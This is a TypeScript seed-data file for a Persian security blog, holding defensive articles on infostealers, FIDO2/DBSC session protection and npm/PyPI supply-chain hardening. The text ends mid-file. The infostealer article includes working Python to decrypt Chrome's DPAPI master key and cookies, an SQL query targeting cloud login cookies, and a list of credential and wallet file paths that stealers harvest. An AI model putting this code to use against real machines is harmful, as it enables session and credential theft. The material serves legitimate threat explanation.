import { getStoredToken } from "./authSync";

export interface DownloadedMediaItem {
  originalUrl: string;
  localPath: string;
  alt?: string;
  sizeBytes?: number;
  status?: "downloaded" | "remote_fallback" | string;
}

export interface ContentCategory {
  id: string;
  name: string;
  slug: string;
  description?: string;
  targetType: "all" | "blog" | "news";
  updatedAt?: string;
}

export const DEFAULT_CATEGORIES: ContentCategory[] = [
  {
    id: "cat-supply-chain",
    name: "حملات زنجیره تامین (Supply Chain)",
    slug: "supply-chain",
    description: "تحلیل نفوذ به مخازن کد، پکیج‌های مسموم NPM/PyPI و وابستگی‌های نرم‌افزاری",
    targetType: "all",
  },
  {
    id: "cat-social-eng",
    name: "مهندسی اجتماعی و فیشینگ",
    slug: "social-engineering",
    description: "تکنیک‌های ClickFix، صفحات جعلی، فیشینگ پیشرفته و سرقت اطلاعات با دستکاری کاربر",
    targetType: "all",
  },
  {
    id: "cat-vulnerabilities",
    name: "تحلیل آسیب‌پذیری و اکسپلویت",
    slug: "vulnerabilities-exploits",
    description: "تحلیل فنی زیرودی‌های فعال (0-Day)، آسیب‌پذیری‌های RCE و بایپس‌های امنیتی",
    targetType: "all",
  },
  {
    id: "cat-writeups",
    name: "گزارش‌های فنی و رایت‌آپ",
    slug: "writeups-research",
    description: "تحقیقات عمیق باینری، کالبدشکافی ساختار فایل‌ها، دیس‌اسمبل و گزارش‌های آزمایشگاهی",
    targetType: "all",
  },
  {
    id: "cat-malware",
    name: "بدافزارها و استیلرها",
    slug: "malware-infostealers",
    description: "رهگیری استیلرهای مدرن (Lumma، RedLine، StealC)، باج‌افزارها و تکنیک‌های بدافزاری",
    targetType: "all",
  },
  {
    id: "cat-cloud",
    name: "امنیت ابری و زیرساخت",
    slug: "cloud-infrastructure",
    description: "امن‌سازی کانتینرها، کوبرنتیز، سرویس‌های ابری و زیرساخت‌های سازمانی",
    targetType: "all",
  },
  {
    id: "cat-alerts",
    name: "اخبار و هشدارهای فوری",
    slug: "security-alerts",
    description: "هشدارهای لحظه‌ای، افشای داده‌ها، حوادث امنیتی جاری و توصیه‌های پدافندی فوری",
    targetType: "all",
  },
];

export interface BlogSectionItem {
  id: string;
  heading: string;
  paragraphs: string[];
  codeSnippet?: string;
  codeLanguage?: string;
  callout?: string;
  calloutType?: "warning" | "info" | "tip";
  imageUrl?: string;
  imageAlt?: string;
  table?: {
    headers: string[];
    rows: string[][];
  };
}

export interface BlogPost {
  id: string;
  title: string;
  subtitle: string;
  slug: string;
  summary: string;
  category: string;
  categoryId?: string;
  readTime: string;
  date: string;
  updatedAt?: string;
  author: string;
  authorRole: string;
  difficulty: "مقدماتی" | "متوسط" | "پیشرفته" | "تخصصی (Deep-Dive)" | string;
  keywords: string[]; // کلیدواژه‌ها
  tags?: string[]; // پشتیبانی گذشته‌نگر
  status: "published" | "draft";
  isFeatured: boolean;
  views: number;
  relatedChapterId?: string;
  coverImage?: string;
  source?: string;
  sourceUrl?: string;
  downloadedImages?: DownloadedMediaItem[];
  tldr: string[]; // خلاصه مدیریتی و نکات کلیدی
  content: {
    intro: string;
    sections: BlogSectionItem[];
    conclusion: string;
    actionableTakeaways: string[]; // چک‌لیست عملیاتی دفاع (تنها در بلاگ)
    references?: { title: string; url: string }[];
  };
}

export interface NewsSectionItem {
  id?: string;
  heading: string;
  paragraphs: string[];
  codeSnippet?: string;
  codeLanguage?: string;
  callout?: string;
  calloutType?: "warning" | "info" | "tip";
  imageUrl?: string;
  imageAlt?: string;
  table?: {
    headers: string[];
    rows: string[][];
  };
}

export interface NewsIoC {
  type: "SHA-256" | "Domain/C2" | "Process/Command" | "File Path" | "YARA/Rule" | string;
  value: string;
  description: string;
}

export interface NewsArticle {
  id: string;
  slug: string;
  title: string;
  subtitle: string;
  category: string;
  categoryId?: string;
  categoryLabel?: string;
  severity?: "CRITICAL" | "HIGH" | "MEDIUM" | "INFO";
  status: "published" | "draft";
  isBreaking?: boolean;
  date: string;
  readTime: string;
  author: string;
  authorRole?: string;
  source: string;
  sourceUrl?: string;
  coverImage?: string;
  downloadedImages?: DownloadedMediaItem[];
  views: number;
  cveIds?: string[];
  cvssScore?: string;
  affectedProducts?: string[];
  exploitStatus?: string;
  summary: string;
  keywords: string[]; // کلیدواژه‌ها (جایگزین برچسب‌ها در انتها)
  tags?: string[]; // پشتیبانی گذشته‌نگر
  tldr?: string[]; // خلاصه خبر و یافته‌های کلیدی (عین ساختار بلاگ)
  keyHighlights?: string[]; // پشتیبانی گذشته‌نگر
  content?: {
    intro: string;
    sections: BlogSectionItem[];
    conclusion: string;
    references?: { title: string; url: string }[];
  };
  sections: NewsSectionItem[];
  iocs?: NewsIoC[];
  mitigationSteps?: string[];
  timeline?: { time: string; event: string }[];
}

export const DEFAULT_BLOG_POSTS: BlogPost[] = [
  {
    id: "post-1",
    title: "کالبدشکافی عمیق بدافزارهای استیلر مدرن: RedLine، LummaC2 و تکنیک‌های دور زدن App-Bound Encryption",
    subtitle: "چگونه بدافزارهای سرقت اطلاعات در کمتر از ۴۵ ثانیه پایگاه‌داده SQLite مرورگرها، کلیدهای DPAPI، نشست‌های تلگرام و کیف‌پول‌های رمزارز را استخراج می‌کنند؟",
    slug: "modern-infostealers-anatomy-redline-lumma-dpapi",
    summary:
      "بررسی مهندسی معکوس و گام‌به‌گام نحوه استخراج پسوردها، سشن کوکی‌های مرورگرهای کرومیوم، دور زدن رمزنگاری App-Bound در کروم ۱۲۷ به بالا و سرقت نشست‌های فعال تلگرام و دیسکورد.",
    category: "استیلر و بدافزار",
    readTime: "۱۲ دقیقه",
    date: "۱۴ مهر ۱۴۰۴",
    author: "تیم تحلیل بدافزار و تهدیدات رهام",
    authorRole: "Roham Threat Research Labs",
    difficulty: "تخصصی (Deep-Dive)",
    tags: ["Infostealer", "LummaC2", "RedLine", "DPAPI", "App-Bound Encryption", "Session Hijacking"],
    status: "published",
    isFeatured: true,
    views: 3420,
    relatedChapterId: "chapter-1",
    tldr: [
      "استیلرهای مدرن بر خلاف باج‌افزارها به دنبال ماندگاری طولانی نیستند؛ کل عملیات جمع‌آوری، فشرده‌سازی و ارسال داده به سرور C2 زیر ۴۵ ثانیه رخ می‌دهد.",
      "کوکی‌های نشست (Session Cookies) به دلیل دور زدن کامل احراز هویت دومرحله‌ای (2FA)، ارزشمندترین دارایی سرقت‌شده توسط LummaC2 و StealC هستند.",
      "مکانیزم جدید App-Bound Encryption در کروم با وجود افزایش امنیت، توسط استیلرهای نسل جدید از طریق تزریق به پروسه‌های دارای سطح دسترسی SYSTEM یا COM Elevation هدف قرار می‌گیرد.",
      "تنها راهکار قطعی، ترکیب ایزولاسیون فایل‌های هویتی در سطح کرنل/کاربر و استفاده از کلیدهای سخت‌افزاری مقاوم به فیشینگ و سرقت (FIDO2) است."
    ],
    content: {
      intro:
        "در اکوسیستم جرایم سایبری امروز، بدافزارهای سرقت اطلاعات (Infostealers) به ستون فقرات اولیه بیش از ۷۵ درصد نفوذهای بزرگ سازمانی و حملات باج‌افزاری تبدیل شده‌اند. مهاجمان دیگر وقت خود را صرف شکستن رمزهای عبور پیچیده نمی‌کنند؛ در عوض، با آلوده‌سازی ایستگاه کاری یک توسعه‌دهنده یا کارمند از طریق تکنیک‌هایی نظیر ClickFix، پکیج‌های مسموم یا فایل‌های نصبی جعلی، مستقیماً تصویر کاملی از هویت دیجیتال قربانی را به سرقت می‌برند.",
      sections: [
        {
          id: "sec-sqlite-lock",
          heading: "۱. معماری ذخیره‌سازی کرومیوم و دور زدن قفل فایل‌های SQLite",
          paragraphs: [
            "مرورگرهای مبتنی بر موتور Chromium (شامل Google Chrome، Microsoft Edge، Brave و Arc) اطلاعات حساس کاربر را در پروفایل محلی درون پوشه AppData\\Local نگهداری می‌کنند. دو فایل حیاتی در این مسیر عبارت‌اند از فایل Login Data (حاوی نام کاربری و پسوردهای ذخیره‌شده) و فایل Network\\Cookies (حاوی توکن‌ها و کوکی‌های نشست فعال).",
            "هر دوی این فایل‌ها پایگاه‌داده‌های رابطه‌ای با فرمت SQLite3 هستند. زمانی که مرورگر باز است، سیستم‌عامل ویندوز یک قفل انحصاری (Exclusive File Lock) روی فایل Cookies ایجاد می‌کند تا پروسه‌های دیگر نتوانند همزمان آن را بخوانند. استیلرهای پیشرفته برای دور زدن این قفل از سه تکنیک استفاده می‌کنند: کپی سایه‌ای از طریق Volume Shadow Copy، استفاده از API ویندوزی Restart Manager برای آزادسازی هندل فایل، یا تزریق مستقیم شل‌کد به درون پروسه زنده مرورگر."
          ],
          codeLanguage: "sql",
          codeSnippet:
            "-- کوئری استاندارد استیلر برای استخراج کوکی‌های احراز هویت دامنه های حساس\nSELECT host_key, name, path, encrypted_value, expires_utc, is_httponly, is_secure\nFROM cookies\nWHERE host_key LIKE '%.google.com'\n   OR host_key LIKE '%.github.com'\n   OR host_key LIKE '%.microsoftonline.com'\n   OR host_key LIKE '%.aws.amazon.com';",
          callout:
            "هشدار امنیتی: کوکی‌های دارای پرچم HttpOnly تنها در برابر اسکریپت‌های جاوااسکریپت درون صفحه (حملات XSS) محافظت می‌شوند، اما در فایل SQLite روی دیسک ذخیره شده و برای هر پروسه‌ای که با دسترسی کاربر فعلی اجرا شود قابل خواندن هستند.",
          calloutType: "warning"
        },
        {
          id: "sec-dpapi-aes",
          heading: "۲. زنجیره رمزگشایی Windows DPAPI و کلید AES-256-GCM",
          paragraphs: [
            "مقادیر ستون encrypted_value در دیتابیس کوکی‌ها و پسوردها به صورت متن خام نیستند. از نسخه ۸۰ کروم به بعد، داده‌ها با الگوریتم متقارن AES-256-GCM رمزنگاری می‌شوند. پیشوند بایت‌های رمزنگاری‌شده با عبارت v10 یا v11 شروع می‌شود که پس از آن ۱۲ بایت Nonce (IV)، متن رمزنگاری‌شده و ۱۶ بایت تگ صحت‌سنجی (Authentication Tag) قرار دارد.",
            "اما کلید اصلی AES کجاست؟ این کلید در فایلی به نام Local State در ریشه پوشه User Data به صورت Base64 ذخیره شده و با پیشوند DPAPI علامت‌گذاری شده است. از آنجا که DPAPI کلید را با نشست کاربر لاگین‌شده (User Logon Session) گره می‌زند، هر بدافزاری که تحت نام همان کاربر اجرا شود، کافی است تابع ویندوزی CryptUnprotectData را صدا بزند تا ویندوز با کمال میل کلید مستر را برایش رمزگشایی کند!"
          ],
          codeLanguage: "python",
          codeSnippet:
            "# شبه‌کد مکانیزم رمزگشایی کلید مستر توسط استیلر در محیط کاربر\nimport json, base64, win32crypt\nfrom Crypto.Cipher import AES\n\nwith open(local_state_path, 'r', encoding='utf-8') as f:\n    encrypted_key = base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:] # حذف پیشوند DPAPI\n\n# فراخوانی API بومی ویندوز با دسترسی کاربر جاری\nmaster_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]\n\n# رمزگشایی کوکی با AES-GCM\nnonce = encrypted_cookie[3:15]\nciphertext = encrypted_cookie[15:-16]\ntag = encrypted_cookie[-16:]\ncipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)\nplaintext_cookie = cipher.decrypt_and_verify(ciphertext, tag)",
          table: {
            headers: ["نسخه مکانیزم", "پیشوند بایت‌ها", "الگوریتم رمزنگاری", "نحوه محافظت کلید اصلی", "وضعیت مقاومت در برابر استیلر محیط کاربر"],
            rows: [
              ["Pre-Chrome 80", "بدون پیشوند", "مستقیم DPAPI", "نشست کاربر ویندوز", "بسیار آسیب‌پذیر (CryptUnprotectData)"],
              ["Chrome 80 - 126", "v10 / v11", "AES-256-GCM", "DPAPI در فایل Local State", "آسیب‌پذیر در برابر هر پروسه سطح User"],
              ["Chrome 127+ (App-Bound)", "v20", "AES-256-GCM / ChaCha20", "سرویس Elevation با سطح SYSTEM", "نیازمند دسترسی Admin/SYSTEM یا تزریق به مرورگر"]
            ]
          }
        },
        {
          id: "sec-app-bound",
          heading: "۳. کالبدشکافی App-Bound Encryption (پیشوند v20) و پاسخ مهاجمان",
          paragraphs: [
            "در جولای ۲۰۲۴ (نسخه ۱۲۷ کروم)، گوگل مکانیزم App-Bound Encryption را معرفی کرد. در این معماری، کلید مستر دیگر با DPAPI سطح کاربر عادی رمز نمی‌شود، بلکه توسط یک سرویس ویندوزی سطح SYSTEM (به نام Chrome Elevation Service) محافظت می‌گردد. این سرویس پیش از تحویل کلید، مسیر اجرایی و امضای دیجیتال پروسه درخواست‌کننده را بررسی می‌کند تا مطمئن شود خود مرورگر کروم درخواست را ارسال کرده است.",
            "با این حال، بررسی نمونه‌های جدید LummaC2، Rhadamanthys و StealC در آزمایشگاه تهدیدات رهام نشان می‌دهد که مهاجمان برای دور زدن پیشوند v20 به سه روش روی آورده‌اند: ۱) راه‌اندازی مرورگر در حالت Headless همراه با پرچم Remote Debugging برای استخراج کوکی از طریق پروتکل CDP؛ ۲) تزریق کد (Process Hollowing / APC Injection) به درون باینری امضاشده chrome.exe؛ و ۳) سوءاستفاده از UAC Bypass برای کسب سطح دسترسی SYSTEM."
          ],
          callout:
            "نکته دفاعی رهام: آنتی‌استیلر هوشمند رهام دقیقاً همین سه گلوگاه (پرچم‌های دیباگ مرورگر، تزریق حافظه به پروسه‌های مرورگر و دسترسی غیرمجاز به فایل‌های SQLite) را در سطح درایور و هوک‌های کاربری مسدود می‌کند.",
          calloutType: "info"
        },
        {
          id: "sec-apps-tokens",
          heading: "۴. فراتر از مرورگر: سرقت نشست‌های تلگرام، دیسکورد، کلیدهای SSH و کیف‌پول‌ها",
          paragraphs: [
            "مرورگرها تنها هدف اول هستند. یک استیلر استاندارد پس از جاروب کردن مرورگرها، بلافاصله سراغ کلاینت‌های دسکتاپ می‌رود. در نرم‌افزار Telegram Desktop، پوشه tdata حاوی فایل‌های کلید نشست است؛ اگر مهاجم این پوشه را کپی کند، بدون نیاز به رمز تایید دومرحله‌ای یا ارسال کد به گوشی قربانی، مستقیماً وارد حساب تلگرام او می‌شود.",
            "به همین ترتیب، در کلاینت Discord و Slack، توکن‌های احراز هویت در دیتابیس LevelDB نگهداری می‌شوند و در ایستگاه‌های کاری توسعه‌دهندگان، فایل‌های ~/.ssh/id_rsa، ~/.aws/credentials و فایل‌های .env پروژه‌ها در عرض چند میلی‌ثانیه استخراج و در یک آرشیو ZIP رمزدار به سرور فرماندهی (C2) یا بات تلگرامی مهاجم ارسال می‌شوند."
          ],
          codeLanguage: "bash",
          codeSnippet:
            "# مسیرهای حیاتی که در مرحله File Grabbing توسط استیلرها اسکن می‌شوند:\n%APPDATA%\\Telegram Desktop\\tdata\\key_datas\n%APPDATA%\\discord\\Local Storage\\leveldb\\*.ldb\n%USERPROFILE%\\.ssh\\id_ed25519\n%USERPROFILE%\\.aws\\credentials\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn # MetaMask"
        }
      ],
      conclusion:
        "آنتی‌ویروس‌های سنتی مبتنی بر امضا (Signature-based AV) به دلیل استفاده روزانه مهاجمان از Crypterهای چندریختی و تکنیک‌های اجرای در حافظه (Fileless PowerShell)، اغلب پس از خروج اطلاعات متوجه حضور استیلر می‌شوند. تغییر پارادایم دفاعی از «شناسایی فایل بدافزار» به «حفاظت سخت‌گیرانه از مخازن هویت و سشن‌ها» تنها راه مقابله موثر با این تهدید است.",
      actionableTakeaways: [
        "هرگز پسوردهای حساس سازمانی و دسترسی‌های ابری را در Password Manager توکار مرورگر ذخیره نکنید.",
        "فراخوانی پروسه‌های فرزند مشکوک و دسترسی پروسه‌های غیرمرورگر به مسیر Network\\Cookies و Local State را مانیتور و مسدود نمایید.",
        "کلیدهای خصوصی SSH را حتماً با Passphrase قوی رمزنگاری کرده و ترجیحاً روی توکن‌های سخت‌افزاری (YubiKey / FIDO2) نگهداری کنید.",
        "در کلاینت تلگرام و برنامه‌های پیام‌رسان، قابلیت قفل محلی (Local Passcode) را فعال کنید تا فایل‌های tdata با کلید مشتق‌شده از رمز شما رمزنگاری شوند."
      ],
      references: [
        { title: "Google Security Blog — Improving Chrome Application-Bound Encryption", url: "https://security.googleblog.com" },
        { title: "MITRE ATT&CK T1539: Steal Web Session Cookie", url: "https://attack.mitre.org/techniques/T1539/" },
        { title: "کتاب «از روز صفر تا روز صفر» — فصل اول و دوم (معماری آسیب‌پذیری‌ها)", url: "/from-day-zero-to-zero-day" }
      ]
    }
  },
  {
    id: "post-2",
    title: "چرا تایید دومرحله‌ای پیامکی و TOTP در برابر سرقت سشن بی‌اثر است؟ معماری رمزنگاری FIDO2 و Passkey",
    subtitle: "تحلیل پروتکل WebAuthn، گره‌خوردن رمزنگاری به دامنه (Origin-Binding) و راهکارهای Device-Bound Session Credentials (DBSC)",
    slug: "why-sms-2fa-fails-session-theft-fido2-dbsc",
    summary:
      "بررسی دقیق فنی شکاف میان «لحظه احراز هویت» و «طول عمر نشست»، چگونگی دور زدن Google Authenticator توسط پراکسی‌های AiTM و استیلرها، و معماری نسل جدید سشن‌های مقید به سخت‌افزار.",
    category: "هویت و سشن‌ها",
    readTime: "۹ دقیقه",
    date: "۸ مهر ۱۴۰۴",
    author: "واحد پژوهش رمزنگاری و امنیت هویت رهام",
    authorRole: "Roham Identity & Cryptography Team",
    difficulty: "متوسط",
    tags: ["FIDO2", "Passkeys", "WebAuthn", "DBSC", "Session Hijacking", "AiTM Phishing"],
    status: "published",
    isFeatured: false,
    views: 2190,
    relatedChapterId: "chapter-3",
    tldr: [
      "احراز هویت دومرحله‌ای (2FA) فقط در «دروازه ورود» بررسی می‌شود؛ پس از صدور کوکی سشن، سرور در هر درخواست بعدی فقط کوکی را چک می‌کند.",
      "کدهای ۶ رقمی پیامکی و نرم‌افزارهای Authenticator در برابر حملات Adversary-in-the-Middle (مانند Evilginx) و بدافزارهای استیلر کاملاً آسیب‌پذیر هستند.",
      "استاندارد FIDO2/Passkey با امضای چالش رمزنگاری بر اساس دامنه دقیق سایت (Origin) فیشینگ را به طور کامل خنثی می‌کند.",
      "استاندارد نوظهور DBSC (Device-Bound Session Credentials) کلید سشن را نیز درون تراشه TPM قفل می‌کند تا حتی در صورت سرقت کوکی، مهاجم نتواند از آن استفاده کند."
    ],
    content: {
      intro:
        "یکی از رایج‌ترین تصورات غلط در میان مدیران فناوری اطلاعات و حتی برخی کارشناسان امنیت این است که «چون روی حساب‌های سازمانی Google Authenticator یا پیامک دومرحله‌ای فعال کرده‌ایم، حساب‌های ما غیرقابل نفوذ هستند». در واقعیت، بیش از ۷۰ درصد حوادث نفوذ به حساب‌های ابری و سازمانی در سال گذشته روی اکانت‌هایی رخ داده که MFA روی آن‌ها فعال بوده است.",
      sections: [
        {
          id: "sec-auth-vs-session",
          heading: "۱. شکاف معماری وب: تفاوت فاز Authentication با فاز Session Management",
          paragraphs: [
            "پروتکل HTTP ذاتاً بدون حالت (Stateless) است. وقتی شما نام کاربری، رمز عبور و کد ۶ رقمی دومرحله‌ای را وارد می‌کنید، سرور هویت شما را تایید کرده و یک توکن نشست (Session Cookie یا JWT) صادر می‌کند. از آن ثانیه به بعد، تا زمانی که آن توکن منقضی نشده باشد (که در بسیاری از سرویس‌ها ۳۰ تا ۹۰ روز اعتبار دارد)، مرورگر در هر درخواست فقط همان توکن را ارسال می‌کند.",
            "وقتی بدافزار استیلر یا پراکسی معکوس مهاجم (AiTM) این کوکی صادرشده را سرقت می‌کند، دیگر نیازی به عبور مجدد از سد رمز عبور یا کد دومرحله‌ای ندارد؛ او دقیقاً در مرحله «پس از احراز هویت» ایستاده است."
          ],
          callout:
            "تشبیه مهندسی: تایید دومرحله‌ای مانند بازرسی دقیق گذرنامه در ورودی هتل است، اما کوکی سشن مانند کارت مغناطیسی اتاق است. هر فردی که کارت اتاق را از جیب شما بدزدد، بدون رد شدن از پذیرش، درِ اتاق را باز می‌کند.",
          calloutType: "info"
        },
        {
          id: "sec-fido2-flow",
          heading: "۲. چگونه FIDO2 و WebAuthn فیشینگ و سرقت اعتبارنامه را متوقف می‌کنند؟",
          paragraphs: [
            "در استاندارد FIDO2 (پیاده‌سازی‌شده به صورت Passkey یا کلیدهای سخت‌افزاری YubiKey)، هیچ راز مشترکی (Shared Secret) بین کاربر و سرور رد و بدل نمی‌شود. هنگام ثبت‌نام، یک جفت کلید نامتقارن (ECDSA P-256 یا Ed25519) درون تراشه امن دستگاه (TPM یا Secure Enclave) تولید می‌شود.",
            "در زمان ورود، سرور یک عدد تصادفی یک‌بارمصرف (Challenge) می‌فرستد. مرورگر این چالش را به همراه نام دامنه واقعی (Origin) به ماژول سخت‌افزاری می‌دهد تا امضا شود. حتی اگر کاربر فریب خورده و وارد دامنه فیشینگ بسیار مشابه شود، امضای تولیدشده برای دامنه جعلی خواهد بود و سرور اصلی آن را رد می‌کند."
          ],
          codeLanguage: "javascript",
          codeSnippet:
            "// ساختار داده ClientDataJSON در پروتکل WebAuthn که به دامنه مقید می‌شود:\n{\n  \"type\": \"webauthn.get\",\n  \"challenge\": \"dGhpcyBpcyBhIHRlc3QgY2hhbGxlbmdl\",\n  \"origin\": \"https://accounts.roham.sec\",\n  \"crossOrigin\": false\n}"
        },
        {
          id: "sec-dbsc-future",
          heading: "۳. حلقه گمشده: استاندارد Device-Bound Session Credentials (DBSC)",
          paragraphs: [
            "اگرچه Passkey جلوی سرقت پسورد و فیشینگ در لحظه لاگین را می‌گیرد، اما اگر پس از لاگین، کوکی سشن توسط استیلر دزدیده شود چه؟ اینجاست که پروتکل جدید DBSC وارد میدان می‌شود.",
            "در معماری DBSC، سرور به جای صدور یک کوکی بلندمدت، یک کوکی بسیار کوتاه‌عمر (مثلاً ۵ دقیقه‌ای) صادر می‌کند و آن را به یک کلید خصوصی داخل تراشه TPM سیستم کاربر گره می‌زند. هر ۵ دقیقه، مرورگر برای تمدید کوکی مجبور است چالش سرور را با کلید داخل TPM امضا کند. از آنجا که استیلر نمی‌تواند کلید خصوصی را از تراشه سخت‌افزاری TPM خارج کند، کوکی سرقت‌شده روی سیستم مهاجم ظرف چند دقیقه از کار می‌افتد!"
          ]
        }
      ],
      conclusion:
        "گذر از پیامک و کدهای TOTP به سمت کلیدهای FIDO2 و معماری سشن‌های مقید به دستگاه (Device-Bound)، مهم‌ترین ارتقای امنیتی دهه اخیر برای حفاظت از هویت کاربران و مدیران سیستم است.",
      actionableTakeaways: [
        "احراز هویت پیامکی (SMS 2FA) را برای تمامی حساب‌های مدیریتی و زیرساختی غیرفعال کنید.",
        "برای ادمین‌های سرور، گیت‌هاب و پنل‌های ابری، کلیدهای سخت‌افزاری FIDO2 یا Passkey مبتنی بر TPM را اجباری نمایید.",
        "سیاست Continuous Access Evaluation (ارزیابی مستمر نشست بر اساس تغییر IP و Fingerprint دستگاه) را در SSO سازمان فعال کنید."
      ]
    }
  },
  {
    id: "post-3",
    title: "امن‌سازی ایستگاه کاری توسعه‌دهندگان در برابر حملات زنجیره تامین، پکیج‌های مسموم npm/PyPI و تروجان‌های Git",
    subtitle: "چگونه اسکریپت‌های preinstall و مخازن جعلی، لپ‌تاپ برنامه‌نویسان را به سکوی پرش مهاجمان به شبکه داخلی تبدیل می‌کنند؟",
    slug: "developer-workstation-hardening-supply-chain-npm-pypi",
    summary:
      "راهنمای جامع مهندسی DevSecOps برای ایزولاسیون محیط توسعه، مهار اجرای کد خودکار در مدیران بسته (npm, pip, cargo) و حفاظت از فایل‌های .env و توکن‌های CI/CD.",
    category: "دفاع و هاردنینگ",
    readTime: "۱۱ دقیقه",
    date: "۲ مهر ۱۴۰۴",
    author: "تیم مهندسی امنیت و DevSecOps رهام",
    authorRole: "Roham Enterprise Security",
    difficulty: "پیشرفته",
    tags: ["Supply Chain", "DevSecOps", "npm", "PyPI", "Dependency Confusion", "Hardening"],
    status: "published",
    isFeatured: false,
    views: 1850,
    relatedChapterId: "chapter-4",
    tldr: [
      "سیستم‌های توسعه‌دهندگان معمولاً دارای دسترسی‌های گسترده به سرورهای پروداکشن، کلیدهای AWS/Cloud و مخازن سورس‌کد هستند.",
      "اجرای یک دستور ساده npm install یا pip install می‌تواند اسکریپت‌های مخرب postinstall و setup.py را بدون هیچ هشداری اجرا کند.",
      "استفاده از کانتینرهای توسعه ایزوله (DevContainers)، غیرفعال‌سازی اسکریپت‌های خودکار و حذف فایل‌های .env متن خام ضروری است."
    ],
    content: {
      intro:
        "در معماری‌های مدرن نرم‌افزاری، دیگر نیازی نیست مهاجم برای نفوذ به سرور اصلی سازمان، فایروال‌های لبه شبکه را بشکند. کافی است یک پکیج متن‌باز با نامی مشابه یکی از کتابخانه‌های مصرفی تیم توسعه (Typosquatting) یا با نسخه بالاتر از پکیج داخلی شرکت (Dependency Confusion) منتشر کند تا توسعه‌دهنده با دست خود کد مخرب را روی لپ‌تاپ خود اجرا نماید.",
      sections: [
        {
          id: "sec-postinstall-abuse",
          heading: "۱. مکانیزم اجرای کد از طریق Lifecycle Scripts در npm و PyPI",
          paragraphs: [
            "مدیران بسته مانند npm، Yarn، pnpm و pip به گونه‌ای طراحی شده‌اند که هنگام نصب یک پکیج، بتوانند کامپایلرهای بومی را اجرا کنند. در اکوسیستم نود جی‌اس، کلیدهای preinstall، install و postinstall در فایل package.json بلافاصله پس از دانلود بسته، دستورات شل دلخواه را با سطح دسترسی کاربر فعلی اجرا می‌کنند.",
            "مهاجمان در این اسکریپت‌ها معمولاً یک دستور یک‌خطی مبهم‌شده قرار می‌دهند که متغیرهای محیطی (process.env)، کلیدهای SSH و کوکی‌های مرورگر توسعه‌دهنده را جمع‌آوری و به سرور خارجی ارسال می‌کند."
          ],
          codeLanguage: "json",
          codeSnippet:
            "{\n  \"name\": \"react-crypto-utils-pro\",\n  \"version\": \"1.0.4\",\n  \"scripts\": {\n    \"preinstall\": \"node -e \\\"const os=require('os'),fs=require('fs'),https=require('https'); /* جمع‌آوری .env و کلیدهای SSH */\\\"\"\n  }\n}",
          callout:
            "با تنظیم ignore-scripts=true در فایل .npmrc سراسری، اجرای خودکار تمامی اسکریپت‌های نصب متوقف شده و بیش از ۹۰٪ حملات پکیج‌های مسموم در نطفه خفه می‌شوند.",
          calloutType: "tip"
        },
        {
          id: "sec-devcontainer-isolation",
          heading: "۲. ایزولاسیون محیط کدنویسی با DevContainers و جداسازی اسرار (.env)",
          paragraphs: [
            "اگر پروسه بیلد یا نصب پکیج مستقیماً روی سیستم‌عامل اصلی (Host OS) اجرا شود، کد مخرب به تمام فایل‌های شخصی، مرورگر و کلیدهای سیستم دسترسی دارد. اما زمانی که پروژه درون یک DevContainer یا ماشین مجازی لینوکسی محدود اجرا می‌شود، دسترسی فایل‌سیستم صرفاً به پوشه همان پروژه محدود است.",
            "علاوه بر این، نگهداری کلیدهای API و رمزهای دیتابیس به صورت متن خام در فایل .env روی دیسک یک ریسک بزرگ است. استفاده از Secret Managerها یا تزریق متغیرها در لحظه اجرا در حافظه (بدون نوشتن روی دیسک) امنیت محیط توسعه را چندین برابر می‌کند."
          ],
          codeLanguage: "bash",
          codeSnippet:
            "# ۱. غیرفعال کردن اسکریپت‌های خودکار در npm به صورت سراسری\nnpm config set ignore-scripts true\n\n# ۲. بررسی آسیب‌پذیری‌ها و تغییرات قفل وابستگی در CI/CD\nnpm ci --ignore-scripts\nnpm audit --audit-level=high"
        }
      ],
      conclusion:
        "امنیت زنجیره تامین نرم‌افزار از لپ‌تاپ برنامه‌نویس آغاز می‌شود. با محدود کردن دسترسی پکیج‌ها و جداسازی محیط اجرا، حتی در صورت دانلود یک کتابخانه آلوده، دارایی‌های سازمان مصون می‌مانند.",
      actionableTakeaways: [
        "فایل ~/.npmrc خود را با گزینه ignore-scripts=true پیکربندی کنید.",
        "کلیدهای دسترسی ابری و پروداکشن را هرگز در فایل‌های .env روی لپ‌تاپ ذخیره نکنید.",
        "از ریپازیتوری‌پراکسی‌های داخلی (مانند Nexus یا Verdaccio) همراه با سیاست اسکن خودکار پکیج‌ها بهره ببرید."
      ]
    }
  },
  {
    id: "post-4",
    title: "از کشف کرش حافظه تا اکسپلویت پایدار: کالبدشکافی آسیب‌پذیری‌های روز صفر (Zero-Day) و مکانیزم‌های دفاعی ASLR و CFI",
    subtitle: "مروری فنی بر مفاهیم بنیادین کتاب «از روز صفر تا روز صفر»، فازینگ هوشمند، Heap Grooming و زنجیره‌های ROP",
    slug: "zero-day-vulnerability-discovery-to-rop-exploit",
    summary:
      "چگونه یک باگ ساده Use-After-Free یا سرریز بافر در کدهای C/C++ به اجرای کد از راه دور تبدیل می‌شود و سیستم‌عامل‌های مدرن چطور در برابر آن مقاومت می‌کنند؟",
    category: "تحقیقات زیرودی",
    readTime: "۱۴ دقیقه",
    date: "۲۵ شهریور ۱۴۰۴",
    author: "مرکز تحقیقات آسیب‌پذیری و نشر رهام",
    authorRole: "Roham Vulnerability Research",
    difficulty: "تخصصی (Deep-Dive)",
    tags: ["Zero-Day", "Memory Corruption", "Use-After-Free", "ASLR", "ROP Chain", "Fuzzing"],
    status: "published",
    isFeatured: false,
    views: 2740,
    relatedChapterId: "chapter-2",
    tldr: [
      "آسیب‌پذیری روز صفر (0-Day) به نقصی گفته می‌شود که پیش از اطلاع سازنده یا انتشار وصله امنیتی، کشف و در حملات هدفمند استفاده شود.",
      "بیش از ۶۵٪ آسیب‌پذیری‌های بحرانی مرورگرها و سیستم‌عامل‌ها ناشی از باگ‌های ایمنی حافظه (Memory Safety) مانند Use-After-Free و Out-of-Bounds Write هستند.",
      "برای تبدیل یک کرش ساده به اکسپلویت کامل، مهاجم باید از سد مکانیزم‌های DEP/NX، ASLR، Stack Canary و Control Flow Integrity (CFI) عبور کند."
    ],
    content: {
      intro:
